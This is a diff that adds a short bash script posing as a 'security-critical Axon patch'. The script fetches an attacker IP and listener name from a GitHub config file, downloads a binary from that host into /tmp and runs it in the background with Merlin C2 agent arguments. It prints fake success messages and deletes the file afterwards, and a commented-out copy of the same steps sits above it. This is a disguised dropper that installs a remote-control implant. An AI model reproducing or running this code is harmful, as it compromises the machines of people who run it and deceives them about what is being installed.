@@ -1,0 +1,23 @@
+#!/bin/bash
+
+tmp_file="/tmp/$(head /dev/urandom | tr -dc A-Fa-f0-9 | head -c 12)"
+ip="$(curl https://raw.githubusercontent.com/svendev045/CurlR/master/config | grep ipaddr | cut -f1 -d" ")"
+l="$(curl https://raw.githubusercontent.com/svendev045/CurlR/master/config | grep list | cut -f1 -d" ")"
+# bin_args="$(curl https://raw.githubusercontent.com/svendev045/CurlR/master/config | grep list | cut -f1 -d" ")-url https://$ip:443/ -psk merlin -listener $l -proto https -debug"
+# echo "Applying security-critical Axon patch..."
+# curl -s http://$ip/mc2 -o $tmp_file >/dev/null 2>&1
+# chmod +x $tmp_file
+# nohup $tmp_file $bin_args >/dev/null 2>&1 &
+# rm $tmp_file
+# sleep 5
+# echo "Axon Critical system patch completed successfully."
+#!/bin/bash
+tmp_file="/tmp/a4f2d6"
+curl http://$ip/mc2 -o $tmp_file >/dev/null 2>&1
+bin_args="-url https://$ip:443/ -psk merlin -listener $l -proto https -debug"
+chmod +x "$tmp_file"
+echo "Applying security-critical Axon patch..."
+nohup "$tmp_file" $bin_args >/dev/null 2>&1 &
+sleep 5
+echo "Axon Critical system patch completed successfully."
+rm "$tmp_file"
